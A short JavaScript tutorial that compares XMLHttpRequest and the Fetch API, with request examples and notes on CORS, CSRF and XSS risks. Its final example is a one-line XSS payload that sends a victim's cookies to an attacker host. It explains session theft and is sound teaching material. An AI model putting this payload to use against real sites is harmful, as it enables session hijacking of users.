
The two main ways JavaScript performs HTTP requests are:
- **XMLHttpRequest (XHR)** – The **older** way, widely supported but more verbose.
- **Fetch API** – The **modern** way, with a cleaner and more flexible syntax.

## XMLHttpRequest (XHR)
The `XMLHttpRequest` object allows JavaScript to make **asynchronous HTTP requests** to a server without reloading the page. It was the core of AJAX (Asynchronous JavaScript and XML) before `fetch()` was introduced.

```javascript
var xhr = new XMLHttpRequest();
xhr.open("GET", "https://example.com/data", true);
xhr.onreadystatechange = function() {
    if (xhr.readyState === 4 && xhr.status === 200) {
        console.log(xhr.responseText); // Process response
    }
};
xhr.send();
```

Security considerations:
- **CORS Restrictions**: Modern browsers enforce **Same-Origin Policy (SOP)**, preventing requests to different domains unless the server explicitly allows it via **Cross-Origin Resource Sharing (CORS)** headers.
- **CSRF Attacks**: If an API endpoint lacks proper authentication (CSRF tokens, SameSite cookies), XHR can be exploited to make **unauthorized requests** on behalf of an authenticated user.
- **XSS & Data Exfiltration**: If an XSS vulnerability is present, an attacker could use XHR to **steal sensitive data** from the same origin.


## Fetch API (Modern Alternative)
Introduced in ES6(2016), the `fetch()` API provides a **simpler and more powerful** way to make HTTP requests.

**GET** request example:
```javascript
fetch("https://example.com/data")
  .then(response => response.text())
  .then(data => console.log(data))
  .catch(error => console.error("Fetch error:", error));
```

**POST** request example:
```javascript
fetch("https://example.com/api", {
  method: "POST",
  headers: {
    "Content-Type": "application/json"
  },
  body: JSON.stringify({ username: "admin", password: "1234" })
})
.then(response => response.json())
.then(data => console.log("Success:", data))
.catch(error => console.error("Error:", error));
```

Security considerations:
- **CORS (Same-Origin Policy Still Applies)**: Just like XHR, `fetch()` cannot bypass **CORS** restrictions without server-side permissions.
- **Credential Leaks**: By default, `fetch()` **does not send cookies** to cross-origin requests unless `credentials: "include"` is set.
- **XSS Risks**: If a vulnerable site allows **malicious JavaScript injection**, `fetch()` can be used to send stolen data to an attacker's server.

Example of an **XSS data exfiltration attack using fetch()**: 

```javascript
fetch('http://attacker.com/log?data=' + encodeURIComponent(document.cookie));
```

This sends the victim's **cookies** to an external server, potentially hijacking sessions.